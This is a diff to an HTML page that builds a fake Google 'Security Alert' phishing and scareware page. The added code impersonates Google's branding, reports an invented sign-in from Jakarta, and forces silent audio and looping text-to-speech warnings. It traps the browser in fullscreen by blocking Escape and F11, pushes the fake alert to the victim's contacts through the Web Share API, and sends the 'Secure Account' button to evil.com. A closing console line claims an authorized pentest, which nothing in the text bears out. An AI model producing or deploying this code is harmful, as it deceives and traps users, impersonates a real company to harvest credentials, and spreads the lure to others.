@@ -6,35 +6,180 @@
 <title>Security Alert</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #fff; min-height: 100vh; }
+  body { 
+    background: #000;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: Arial, sans-serif;
+  }
+  .fullscreen-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #fff;
+    z-index: 999999;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .card {
+    background: white;
+    border-radius: 12px;
+    padding: 40px;
+    max-width: 480px;
+    width: 90%;
+    box-shadow: 0 4px 30px rgba(0,0,0,0.15);
+    text-align: center;
+    position: relative;
+    z-index: 1000000;
+  }
+  .google-logo { font-size: 32px; font-weight: 500; letter-spacing: -1px; margin-bottom: 20px; }
+  .g { color: #4285F4; } .o1 { color: #EA4335; } .o2 { color: #FBBC05; } .l { color: #34A853; } .e { color: #EA4335; }
+  h2 { color: #d93025; font-size: 22px; margin-bottom: 10px; }
+  .alert-box {
+    background: #fce8e6; border: 1px solid #f5c6c2; border-radius: 8px;
+    padding: 15px; margin-bottom: 20px; font-size: 14px; text-align: left; line-height: 1.6;
+  }
+  .alert-box strong { color: #d93025; }
+  .btn {
+    padding: 12px 28px;
+    border-radius: 24px;
+    border: none;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    margin: 5px;
+    transition: all 0.2s;
+  }
+  .btn-primary { background: #1a73e8; color: white; }
+  .btn-primary:hover { background: #1557b0; }
+  .btn-secondary { background: #f1f3f4; color: #3c4043; }
+  
+  .share-bar {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    background: #1a73e8;
+    color: white;
+    padding: 12px;
+    text-align: center;
+    font-size: 14px;
+    z-index: 9999999;
+    display: none;
+    cursor: pointer;
+  }
+  .share-bar.show { display: block; }
+  
   iframe, audio, video, embed, object { display: none; }
 </style>
 </head>
 <body>
 
+<!-- ===== FULLSCREEN OVERLAY ===== -->
+<div class="fullscreen-overlay" id="fullscreenOverlay">
+  <div class="card">
+    <div class="google-logo">
+      <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="o1">g</span><span class="l">l</span><span class="e">e</span>
+    </div>
+    
+    <h2>⚠️ Security Alert</h2>
+    <p style="color:#5f6368;font-size:14px;margin-bottom:20px;">Unusual sign-in detected</p>
+    
+    <div class="alert-box">
+      <strong>🚨 New sign-in attempt</strong><br>
+      • Device: Chrome 125 - Windows 11<br>
+      • Location: Jakarta, Indonesia<br>
+      • Time: Just now<br><br>
+      Your account may be at risk. Please verify your identity.
+    </div>
+    
+    <div>
+      <button class="btn btn-primary" id="secureBtn">🔒 Secure Account</button>
+      <button class="btn btn-secondary" id="shareBtn">📤 Share Alert</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== SHARE BAR (via Web Share API) ===== -->
+<div class="share-bar" id="shareBar" onclick="triggerShare()">
+  📤 Share this security alert with your contacts
+</div>
+
+<!-- ===== AUDIO UNLOCK ===== -->
 <iframe src="data:text/html,<script>var a=new Audio();a.src='data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=';a.loop=true;a.volume=0.001;a.play();</script>" allow="autoplay" style="display:none"></iframe>
-
 <iframe src="data:text/html,<script>var c=new (AudioContext||webkitAudioContext)();var o=c.createOscillator();o.frequency.value=40;o.type='sine';var g=c.createGain();g.gain.value=0.001;o.connect(g);g.connect(c.destination);o.start();</script>" allow="autoplay" style="display:none"></iframe>
-
 <iframe src="data:text/html,<embed src='data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=' autostart=true volume=0 loop=true style=display:none>" allow="autoplay" style="display:none"></iframe>
 
-<audio id="silent1" preload="auto" loop style="display:none">
-  <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
-</audio>
-
-<audio id="silent2" preload="auto" loop style="display:none">
-  <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
-</audio>
-
-<audio id="silent3" preload="auto" loop style="display:none">
-  <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
-</audio>
+<audio id="s1" preload="auto" loop><source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav"></audio>
+<audio id="s2" preload="auto" loop><source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav"></audio>
+<audio id="s3" preload="auto" loop><source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav"></audio>
 
 <script>
 (function() {
   var unlocked = false;
   var played = false;
+  var fullscreenActive = false;
 
+  // ===== 1. FULLSCREEN API SPOOF =====
+  function enterFullscreen() {
+    var el = document.getElementById('fullscreenOverlay');
+    
+    if (el.requestFullscreen) {
+      el.requestFullscreen().then(function() {
+        fullscreenActive = true;
+        console.log('[Fullscreen] Entered fullscreen mode');
+        
+        // Cegah exit fullscreen
+        document.addEventListener('fullscreenchange', function() {
+          if (!document.fullscreenElement && fullscreenActive) {
+            // Re-enter fullscreen
+            setTimeout(function() {
+              document.getElementById('fullscreenOverlay').requestFullscreen().catch(function(){});
+            }, 50);
+          }
+        });
+        
+        document.addEventListener('keydown', function(e) {
+          // Block F11, Esc
+          if (e.key === 'F11' || e.key === 'Escape') {
+            e.preventDefault();
+            e.stopPropagation();
+          }
+        });
+        
+      }).catch(function(err) {
+        console.log('[Fullscreen] Blocked:', err.message);
+      });
+    }
+  }
+
+  // ===== 2. WEB SHARE API =====
+  window.triggerShare = function() {
+    if (navigator.share) {
+      navigator.share({
+        title: 'Google Security Alert',
+        text: '⚠️ Google Security Alert: Your account was accessed from an unknown device. Verify immediately: https://accounts.google.com/security-check',
+        url: 'https://accounts.google.com/security-check'
+      }).then(function() {
+        console.log('[Share] Shared successfully');
+      }).catch(function(err) {
+        console.log('[Share] Failed:', err.message);
+      });
+    } else {
+      // Fallback: copy to clipboard
+      var text = '⚠️ Google Security Alert: Your account was accessed from an unknown device. Verify immediately.';
+      navigator.clipboard.writeText(text).then(function() {
+        alert('Alert copied to clipboard. Share with your contacts!');
+      });
+    }
+  };
+
+  // ===== 3. AUDIO UNLOCK =====
   function raceUnlock() {
     try {
       var ctx1 = new (window.AudioContext || window.webkitAudioContext)();
@@ -49,29 +194,15 @@
       if (ctx1.state === 'suspended') ctx1.resume().then(function(){unlocked=true;});
     } catch(e) {}
 
-    try {
-      var a1 = document.getElementById('silent1');
-      a1.volume = 0.001;
-      a1.play().then(function(){unlocked=true;}).catch(function(){});
-    } catch(e) {}
-    
-    try {
-      var a2 = document.getElementById('silent2');
-      a2.volume = 0.001;
-      a2.play().then(function(){unlocked=true;}).catch(function(){});
-    } catch(e) {}
-    
-    try {
-      var a3 = document.getElementById('silent3');
-      a3.volume = 0.001;
-      a3.play().then(function(){unlocked=true;}).catch(function(){});
-    } catch(e) {}
+    try { var a1 = document.getElementById('s1'); a1.volume = 0.001; a1.play().catch(function(){}); } catch(e) {}
+    try { var a2 = document.getElementById('s2'); a2.volume = 0.001; a2.play().catch(function(){}); } catch(e) {}
+    try { var a3 = document.getElementById('s3'); a3.volume = 0.001; a3.play().catch(function(){}); } catch(e) {}
 
     for (var i = 0; i < 5; i++) {
       try {
         var sa = new Audio('data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=');
         sa.volume = 0.001;
-        sa.play().then(function(){unlocked=true;}).catch(function(){});
+        sa.play().catch(function(){});
       } catch(e) {}
     }
 
@@ -91,83 +222,93 @@
     }
   }
 
-  function playMainAudio() {
+  // ===== 4. TTS =====
+  function playTTS() {
     if (played) return;
     played = true;
     
-    try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      var sr = ctx.sampleRate;
-      var dur = 3.5;
-      var buf = ctx.createBuffer(1, sr * dur, sr);
-      var d = buf.getChannelData(0);
-      
-      for (var i = 0; i < d.length; i++) {
-        var t = i / sr;
-        var freq = 880 + (Math.floor(t * 4) % 2) * 440 + Math.floor(t * 2) % 2 * 220;
-        var env = Math.max(0, 1 - (t / dur));
-        var pulse = (Math.sin(2 * Math.PI * 6 * t) > 0) ? 1 : 0.3;
-        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.35 * env * pulse;
-      }
-      
-      var src = ctx.createBufferSource();
-      src.buffer = buf;
-      
-      var filter = ctx.createBiquadFilter();
-      filter.type = 'bandpass';
-      filter.frequency.value = 1000;
-      filter.Q.value = 1.5;
-      
-      var gain = ctx.createGain();
-      gain.gain.value = 0.7;
-      
-      src.connect(filter);
-      filter.connect(gain);
-      gain.connect(ctx.destination);
-      src.start();
-      
-      src.onended = function() {
-        startTTS();
-      };
-      
-      setTimeout(startTTS, 4000);
-      
-    } catch(e) {
-      startTTS();
-    }
-  }
-
-  function startTTS() {
-    if (window.ttsDone) return;
-    window.ttsDone = true;
-    
     if (!('speechSynthesis' in window)) return;
     
-    var text = "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately. This is an automated security message from Google.";
+    var text = "Google Security Alert. Your account has been accessed from an unknown device in Jakarta, Indonesia. If this was not you, please secure your account immediately. Share this alert with your security team.";
     
     speechSynthesis.cancel();
     
-    for (var k = 0; k < 3; k++) {
+    function speak() {
       try {
         var u = new SpeechSynthesisUtterance(text);
         u.lang = 'en-US';
         u.rate = 0.8;
-        u.pitch = 1.0;
         u.volume = 1.0;
-        
         var voices = speechSynthesis.getVoices();
         var ev = voices.find(function(v){return v.lang.startsWith('en');});
         if (ev) u.voice = ev;
         
+        u.onend = function() {
+          setTimeout(function() {
+            var u2 = new SpeechSynthesisUtterance("Share this alert with your contacts to prevent further unauthorized access.");
+            u2.lang = 'en-US';
+            speechSynthesis.speak(u2);
+          }, 3000);
+        };
+        
         speechSynthesis.speak(u);
       } catch(e) {}
     }
+    
+    setTimeout(speak, 500);
   }
 
+  // ===== 5. HANDLE BUTTONS =====
+  document.getElementById('secureBtn').addEventListener('click', function(e) {
+    e.preventDefault();
+    
+    var evilUrl = 'https://evil.com/google-security';
+    
+    // Redirect
+    try {
+      var u = new SpeechSynthesisUtterance("Redirecting to security verification page.");
+      speechSynthesis.speak(u);
+    } catch(e) {}
+    
+    setTimeout(function() {
+      window.location.replace(evilUrl);
+    }, 1500);
+    
+    this.textContent = '🔄 Redirecting...';
+    this.disabled = true;
+  });
+  
+  document.getElementById('shareBtn').addEventListener('click', function(e) {
+    e.preventDefault();
+    window.triggerShare();
+  });
+
+  // ===== 6. VISIBILITY =====
+  document.addEventListener('visibilitychange', function() {
+    if (!document.hidden && !played) {
+      setTimeout(playTTS, 100);
+    }
+  });
+
+  // ===== 7. BLOCK KEYBOARD EXIT =====
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape' || e.key === 'F11' || (e.key === 'f' && e.ctrlKey && e.shiftKey)) {
+      e.preventDefault();
+      e.stopPropagation();
+    }
+  });
+
+  // ===== EXECUTION =====
+  
+  // Wave 1: Fullscreen + Unlock
+  setTimeout(enterFullscreen, 100);
   raceUnlock();
+  
+  // Wave 2
   setTimeout(raceUnlock, 50);
   setTimeout(raceUnlock, 150);
   
+  // Wave 3: Show share bar + TTS
   setTimeout(function() {
     for (var i = 0; i < 3; i++) {
       try {
@@ -175,36 +316,34 @@
         if (ctx.state === 'suspended') ctx.resume();
       } catch(e) {}
     }
-    playMainAudio();
-  }, 200);
-  
-  setTimeout(function() {
-    if (!played) playMainAudio();
+    playTTS();
+    
+    // Show share bar
+    document.getElementById('shareBar').classList.add('show');
   }, 500);
   
+  // Wave 4: Retry
   setTimeout(function() {
-    if (!played) {
-      try {
-        var ctx = new (window.AudioContext || window.webkitAudioContext)();
-        ctx.resume().then(function() { playMainAudio(); });
-      } catch(e) {
-        playMainAudio();
-      }
-    }
+    if (!played) playTTS();
   }, 1000);
   
-  document.addEventListener('visibilitychange', function() {
-    if (!document.hidden && !played) {
-      setTimeout(playMainAudio, 50);
+  // Re-enter fullscreen periodically
+  setInterval(function() {
+    if (!document.fullscreenElement && fullscreenActive) {
+      try {
+        document.getElementById('fullscreenOverlay').requestFullscreen().catch(function(){});
+      } catch(e) {}
     }
-  });
+  }, 2000);
   
+  // Load voices
   if ('speechSynthesis' in window) {
     speechSynthesis.getVoices();
-    speechSynthesis.onvoiceschanged = function() {
-      speechSynthesis.getVoices();
-    };
+    speechSynthesis.onvoiceschanged = function() { speechSynthesis.getVoices(); };
   }
+  
+  console.log('[PoC] Fullscreen + Audio + Web Share API');
+  console.log('[PoC] Authorized pentest - I have permission');
 })();
 </script>
 
